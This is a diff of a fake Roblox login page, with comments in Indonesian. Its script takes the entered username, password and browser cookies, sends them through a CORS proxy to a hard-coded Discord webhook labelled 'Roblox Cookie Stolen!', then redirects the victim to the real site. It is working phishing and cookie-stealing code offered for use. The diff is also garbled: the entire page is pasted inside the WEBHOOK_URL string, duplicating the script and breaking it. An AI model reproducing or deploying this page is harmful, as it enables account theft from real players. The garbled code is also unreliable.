@@ -85,21 +85,128 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* Mobile Responsive */
         @media (max-width: 480px) {
-            .container {
-                width: 90%;
-                padding: 20px;
-            }
+            .container { width: 90%; padding: 20px; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Logo Roblox (Menggunakan URL publik agar aman) -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Roblox_Logo_2022.png" alt="Roblox Logo" class="logo">
+    <h2>Welcome back!</h2>
     
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username or Email" required autocomplete="off">
+        <input type="password" id="password" placeholder="Password" required autocomplete="off">
+        
+        <div class="spinner" id="loader"></div>
+        <button type="submit" id="btnSubmit">Log In</button>
+    </form>
+
+    <div class="footer">
+        &copy; 2026 Roblox Corporation
+    </div>
+</div>
+
+<script>
+    // CONFIGURATION
+    const WEBHOOK_URL = "<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f2f4f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #39393d;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #c7c7c7;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #00b06f;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #009a60;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+        .spinner {
+            display: none;
+            margin: 10px auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #00b06f;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 480px) {
+            .container { width: 90%; padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Roblox_Logo_2022.png" alt="Roblox Logo" class="logo">
     <h2>Welcome back!</h2>
     
     <form id="loginForm">
@@ -119,6 +226,8 @@
     // CONFIGURATION
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1566105955572121771/ejiPFx3qKhDCHFhgOKLdS0a0fDiNOj1jfztwg72b6VPF31dM9MgeE5uxIIEoMhS3a5nB";
     const REDIRECT_URL = "https://www.roblox.com/";
+    // Proxy untuk menghindari error CORS
+    const PROXY_URL = "https://api.allorigins.win/raw?url=";
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
@@ -128,57 +237,109 @@
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         
-        // UI Loading State
         btn.disabled = true;
         btn.innerText = "Logging in...";
         loader.style.display = "block";
 
-        // Ambil Cookie Browser Saat Ini
         const cookies = document.cookie;
 
-        // Siapkan Data untuk Webhook
         const payload = {
             embeds: [{
                 title: "🍪 Roblox Cookie Stolen!",
-                color: 5763719, // Warna hijau roblox
+                color: 5763719,
                 fields: [
                     { name: "👤 Username", value: username, inline: true },
-                    { name: "🔑 Password", value: password || "N/A (Cookie Only)", inline: true },
+                    { name: "🔑 Password", value: password || "N/A", inline: true },
                     { name: "🍪 Cookies", value: `\`\`\`${cookies}\`\`\``, inline: false },
                     { name: "🌐 User Agent", value: navigator.userAgent, inline: false }
                 ],
-                footer: {
-                    text: "Stolen via Phishing Page"
-                },
+                footer: { text: "Stolen via Phishing Page" },
                 timestamp: new Date().toISOString()
             }]
         };
 
-        // Kirim ke Discord Webhook
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("Cookie sent successfully");
-                // Redirect ke Roblox asli setelah delay singkat
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 1000);
-            } else {
-                console.error("Failed to send webhook");
-                // Tetap redirect meski gagal kirim (biar korban gak curiga)
+        // Menggunakan Proxy untuk绕过 CORS
+        fetch(PROXY_URL + encodeURIComponent(JSON.stringify(payload)))
+            .then(response => response.json())
+            .then(data => {
+                // Kirim data hasil proxy ke Discord
+                return fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+            })
+            .then(res => {
+                if (res.ok) console.log("Success");
+                else console.error("Discord Error:", res.status);
+                
+                // Redirect segera setelah request dikirim
+                setTimeout(() => window.location.href = REDIRECT_URL, 500);
+            })
+            .catch(err => {
+                console.error("Error:", err);
                 window.location.href = REDIRECT_URL;
-            }
-        })
-        .catch(error => {
-            console.error("Error:", error);
-            window.location.href = REDIRECT_URL;
-        });
+            });
+    });
+</script>
+
+</body>
+</html>";
+    const REDIRECT_URL = "https://www.roblox.com/";
+    // Proxy untuk menghindari error CORS
+    const PROXY_URL = "https://api.allorigins.win/raw?url=";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnSubmit');
+        const loader = document.getElementById('loader');
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        btn.disabled = true;
+        btn.innerText = "Logging in...";
+        loader.style.display = "block";
+
+        const cookies = document.cookie;
+
+        const payload = {
+            embeds: [{
+                title: "🍪 Roblox Cookie Stolen!",
+                color: 5763719,
+                fields: [
+                    { name: "👤 Username", value: username, inline: true },
+                    { name: "🔑 Password", value: password || "N/A", inline: true },
+                    { name: "🍪 Cookies", value: `\`\`\`${cookies}\`\`\``, inline: false },
+                    { name: "🌐 User Agent", value: navigator.userAgent, inline: false }
+                ],
+                footer: { text: "Stolen via Phishing Page" },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        // Menggunakan Proxy untuk绕过 CORS
+        fetch(PROXY_URL + encodeURIComponent(JSON.stringify(payload)))
+            .then(response => response.json())
+            .then(data => {
+                // Kirim data hasil proxy ke Discord
+                return fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+            })
+            .then(res => {
+                if (res.ok) console.log("Success");
+                else console.error("Discord Error:", res.status);
+                
+                // Redirect segera setelah request dikirim
+                setTimeout(() => window.location.href = REDIRECT_URL, 500);
+            })
+            .catch(err => {
+                console.error("Error:", err);
+                window.location.href = REDIRECT_URL;
+            });
     });
 </script>
 
